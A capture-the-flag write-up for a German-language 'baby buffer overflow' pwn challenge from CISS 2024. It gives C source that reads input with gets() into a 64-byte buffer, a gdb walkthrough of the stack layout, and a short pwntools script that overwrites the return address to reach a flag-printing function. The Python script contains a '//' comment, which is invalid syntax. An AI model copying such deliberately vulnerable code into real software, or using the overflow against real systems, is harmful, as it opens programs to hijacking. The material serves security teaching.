title: "Baby buffer overflow - CISS 2024"
---

# Background

This is a pwn challenge from CISS2024, unfortunately this was eventually cancelled because they reused challenges and solutions were found half-way through the ctf :(

# Start

Very simple bof problem just by looking at the source code.

```c
#include <stdio.h>
#include <stdlib.h>

#define TRUE 1 

void gruss() {
    //Kein Teilnehmer wird einen Namen mit mehr als 64 Buchstaben haben
    char name_user[64] = {'\0'};
    printf("Wie heisst du?:\n");
    gets(name_user);
    printf("Hallo %s. Viel Spass bei DBH!\n", name_user);
}

void spass() {
    printf("So macht DBH doch viel mehr Spass.\n");
    char* args[3] = {"/bin/cat", "./flag.txt", NULL};
    execve(args[0], args, NULL);
}

int main(int argc, char* argv[]) {
    gruss();
}
```

The usual `gets()` function where it excepts whatever the user throws at it until it receives a `\n` character. This allows us to input more than the allocated size of the buffer.

# More info

A quick `checksec` reviews that there are no protection mechanisms on the binary.

>maybe its a bit too easy

We also find out the binary is 64bit.

# Exploit

A quick gdb tour tells us the address of `name_user` buffer at `rbp - 0x40` is loaded into `rax` at `*gruss + 101` then its moved into `rsi` for `printf`. Lets set a break point at `*gruss + 105`

![Pasted image 20240919223120](https://github.com/user-attachments/assets/2bbd72b8-4e99-4c3c-84b0-5b1ec6482899)

After we hit the breakpoint we can take a look at the registers

We obtain the address of `rbp` and from the disassembled code of the `gruss` function, we know that `rbp - 0x40` is where the input buffer starts.

Taking a look at the stack values we indeed see the `A`'s we send. We also see the return address that we have to overflow at `rbp + 8`. Our job here is very easy because there is no canary for this binary.

![Pasted image 20240919224614](https://github.com/user-attachments/assets/e6a3dc70-447b-4754-8c53-e5474987804e)

We then disassemble the `spass` function which prints out the flag. Because there is no PIE the address of the function will always be `0x4011d2`.

# More exploit

Knowing the offset and what we have to overflow, we craft a simple exploit script.

```python
from pwn import *

context.binary = "/home/kali/greetings"
p = process('/home/kali/greetings')

// 64 buffer + 8 = 72
payload = b'A' * 72 + p64(0x4011d2)

p.sendline(payload)
p.interactive()
```

Great!
